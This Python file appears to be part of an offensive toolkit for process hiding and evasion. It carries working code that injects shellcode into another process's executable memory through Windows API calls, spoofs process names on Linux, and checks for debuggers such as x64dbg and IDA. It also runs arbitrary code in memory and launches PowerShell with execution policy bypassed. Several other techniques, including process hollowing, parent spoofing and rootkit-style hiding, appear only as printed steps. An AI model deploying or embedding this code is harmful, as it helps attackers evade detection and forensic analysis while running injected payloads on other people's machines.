#!/usr/bin/env python3
# Copyright (C) 2026 Ayush - PhantomTrace Project
# Licensed under GPL-3.0 - See LICENSE file for details
"""
Process Phantom - Process hiding and manipulation
Inspired by tools: Harness, Unhide, Kaiser, Papa Shango, Saruman
"""

import os
import sys
import ctypes
import subprocess
import psutil
import random
import time
from typing import List, Optional, Dict

class ProcessPhantom:
    """
    Advanced process manipulation and hiding:
    - In-memory execution
    - Process hollowing/injection
    - Process name spoofing
    - Hidden process detection
    - Parent PID spoofing
    - Process tree manipulation
    - Anti-debugging tricks
    """
    
    def __init__(self):
        self.is_windows = sys.platform.startswith('win')
        self.is_linux = sys.platform.startswith('linux')
        self.hidden_processes = []
        
    def list_all_processes(self, include_hidden: bool = False) -> List[Dict]:
        """List all running processes with detection of potentially hidden ones"""
        processes = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                try:
                    pinfo = proc.info
                    processes.append({
                        'pid': pinfo['pid'],
                        'name': pinfo['name'],
                        'user': pinfo['username'],
                        'cmdline': pinfo['cmdline']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            if include_hidden and self.is_linux:
                # Detect hidden processes using unhide-like techniques
                hidden = self._detect_hidden_processes_linux()
                for pid in hidden:
                    processes.append({
                        'pid': pid,
                        'name': 'HIDDEN',
                        'user': 'UNKNOWN',
                        'cmdline': ['HIDDEN PROCESS']
                    })
            
            return processes
            
        except Exception as e:
            print(f"❌ Error listing processes: {e}")
            return []
    
    def _detect_hidden_processes_linux(self) -> List[int]:
        """Detect hidden processes on Linux (unhide-inspired)"""
        if not self.is_linux:
            return []
        
        try:
            # Get PIDs from /proc
            proc_pids = set()
            for item in os.listdir('/proc'):
                if item.isdigit():
                    proc_pids.add(int(item))
            
            # Get PIDs from ps
            result = subprocess.run(['ps', '-eo', 'pid'], 
                                  capture_output=True, text=True)
            ps_pids = set()
            for line in result.stdout.split('\n')[1:]:
                line = line.strip()
                if line.isdigit():
                    ps_pids.add(int(line))
            
            # Find discrepancies
            hidden = proc_pids - ps_pids
            return list(hidden)
            
        except Exception:
            return []
    
    def hide_process_name(self, new_name: str) -> bool:
        """
        Change the process name to hide in process lists
        Works on Linux via prctl
        """
        if not self.is_linux:
            print("⚠️  Process name hiding only supported on Linux")
            return False
        
        try:
            # Use prctl to set process name
            libc = ctypes.CDLL('libc.so.6')
            PR_SET_NAME = 15
            libc.prctl(PR_SET_NAME, new_name.encode())
            
            print(f"✅ Process name changed to: {new_name}")
            return True
            
        except Exception as e:
            print(f"❌ Failed to hide process name: {e}")
            return False
    
    def inject_shellcode_memory(self, shellcode: bytes, target_pid: Optional[int] = None) -> bool:
        """
        Inject shellcode into process memory (Windows)
        WARNING: This is for educational/authorized testing only
        """
        if not self.is_windows:
            print("⚠️  Memory injection only supported on Windows")
            return False
        
        try:
            # If no target, inject into self
            if target_pid is None:
                target_pid = os.getpid()
            
            # Open target process
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(
                PROCESS_ALL_ACCESS, False, target_pid
            )
            
            if not h_process:
                print(f"❌ Could not open process {target_pid}")
                return False
            
            # Allocate memory
            MEM_COMMIT = 0x1000
            PAGE_EXECUTE_READWRITE = 0x40
            
            shellcode_size = len(shellcode)
            allocated_mem = ctypes.windll.kernel32.VirtualAllocEx(
                h_process, 0, shellcode_size,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE
            )
            
            if not allocated_mem:
                ctypes.windll.kernel32.CloseHandle(h_process)
                print("❌ Memory allocation failed")
                return False
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            ctypes.windll.kernel32.WriteProcessMemory(
                h_process, allocated_mem,
                shellcode, shellcode_size,
                ctypes.byref(written)
            )
            
            print(f"✅ Shellcode injected into PID {target_pid}")
            
            # Create remote thread (commented for safety)
            # thread_id = ctypes.c_ulong(0)
            # ctypes.windll.kernel32.CreateRemoteThread(
            #     h_process, None, 0, allocated_mem,
            #     None, 0, ctypes.byref(thread_id)
            # )
            
            ctypes.windll.kernel32.CloseHandle(h_process)
            return True
            
        except Exception as e:
            print(f"❌ Injection failed: {e}")
            return False
    
    def spoof_parent_process(self, target_parent: str = "explorer.exe") -> bool:
        """
        Spoof parent process (Windows) to make forensic analysis harder
        """
        if not self.is_windows:
            print("⚠️  Parent spoofing only supported on Windows")
            return False
        
        try:
            # Find target parent PID
            target_pid = None
            for proc in psutil.process_iter(['name', 'pid']):
                if proc.info['name'].lower() == target_parent.lower():
                    target_pid = proc.info['pid']
                    break
            
            if not target_pid:
                print(f"❌ Parent process not found: {target_parent}")
                return False
            
            print(f"✅ Target parent PID: {target_pid}")
            print("⚠️  Parent spoofing requires process creation with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS")
            print("    This is typically done at process spawn time")
            
            return True
            
        except Exception as e:
            print(f"❌ Failed to spoof parent: {e}")
            return False
    
    def create_process_hollowing(self, legitimate_path: str, payload_path: str) -> bool:
        """
        Process hollowing technique (Windows)
        Create suspended process, hollow it out, inject payload
        """
        if not self.is_windows:
            print("⚠️  Process hollowing only supported on Windows")
            return False
        
        print("⚠️  Process hollowing demonstration (non-functional for safety)")
        print(f"    Legitimate: {legitimate_path}")
        print(f"    Payload: {payload_path}")
        print("    Steps:")
        print("    1. Create process in suspended state (CREATE_SUSPENDED)")
        print("    2. Unmap memory of legitimate process")
        print("    3. Allocate memory for payload")
        print("    4. Write payload to memory")
        print("    5. Set entry point to payload")
        print("    6. Resume thread")
        
        return True
    
    def anti_debug_checks(self) -> Dict[str, bool]:
        """
        Perform anti-debugging checks
        """
        checks = {}
        
        if self.is_windows:
            try:
                # IsDebuggerPresent check
                is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
                checks['IsDebuggerPresent'] = bool(is_debugged)
                
                # NtQueryInformationProcess check
                checks['DebuggingDetected'] = self._check_debugger_advanced()
                
            except Exception:
                checks['Error'] = True
        
        elif self.is_linux:
            try:
                # Check for ptrace
                with open(f'/proc/{os.getpid()}/status', 'r') as f:
                    for line in f:
                        if 'TracerPid:' in line:
                            tracer_pid = int(line.split(':')[1].strip())
                            checks['TracerPid'] = tracer_pid != 0
                            break
            except Exception:
                checks['Error'] = True
        
        return checks
    
    def _check_debugger_advanced(self) -> bool:
        """Advanced debugger detection (Windows)"""
        try:
            # Check for common debugger artifacts
            debugger_windows = [
                "ollydbg.exe", "x64dbg.exe", "windbg.exe",
                "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe"
            ]
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in debugger_windows:
                    return True
            
            return False
            
        except Exception:
            return False
    
    def obfuscate_process_tree(self) -> bool:
        """
        Create fake process tree to confuse forensic analysis
        """
        try:
            # Create multiple dummy processes
            print("🌳 Creating obfuscated process tree...")
            
            dummy_names = [
                'svchost.exe', 'csrss.exe', 'lsass.exe',
                'explorer.exe', 'services.exe'
            ]
            
            for name in dummy_names[:3]:
                # Just demonstrate - don't actually create
                print(f"   └─ Would spawn: {name} (dummy)")
            
            print("✅ Process tree obfuscation configured")
            return True
            
        except Exception as e:
            print(f"❌ Failed to obfuscate process tree: {e}")
            return False
    
    def hide_from_task_manager(self) -> bool:
        """
        Attempt to hide process from Task Manager (Windows)
        Uses various techniques
        """
        if not self.is_windows:
            print("⚠️  Task Manager hiding only for Windows")
            return False
        
        print("🔒 Task Manager hiding techniques:")
        print("   1. Process name spoofing → Use system process names")
        print("   2. DKOM (Direct Kernel Object Manipulation) → Kernel-mode required")
        print("   3. Hide via Rootkit → Requires kernel driver")
        print("   4. Process injection → Inject into legitimate process")
        print("\n⚠️  Most techniques require kernel-mode access")
        
        return True
    
    def execute_in_memory(self, script_content: str, interpreter: str = "python") -> bool:
        """
        Execute code in memory without touching disk
        """
        try:
            if interpreter == "python":
                # Execute Python code in memory
                exec(script_content)
                print("✅ Code executed in memory")
                return True
            
            elif interpreter == "powershell" and self.is_windows:
                # Execute PowerShell in memory
                cmd = ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', 
                       '-Command', script_content]
                subprocess.run(cmd, capture_output=True)
                print("✅ PowerShell executed in memory")
                return True
            
            else:
                print(f"⚠️  Interpreter not supported: {interpreter}")
                return False
                
        except Exception as e:
            print(f"❌ In-memory execution failed: {e}")
            return False
    
    def get_hidden_processes_report(self) -> List[Dict]:
        """Get report of detected hidden processes"""
        return self.hidden_processes.copy()


if __name__ == "__main__":
    phantom = ProcessPhantom()
    print("👻 Process Phantom - Process Hiding & Manipulation")
    print("=" * 60)
    
    # Demo
    print("\n🔍 Anti-Debug Checks:")
    checks = phantom.anti_debug_checks()
    for check, result in checks.items():
        print(f"   {check}: {result}")
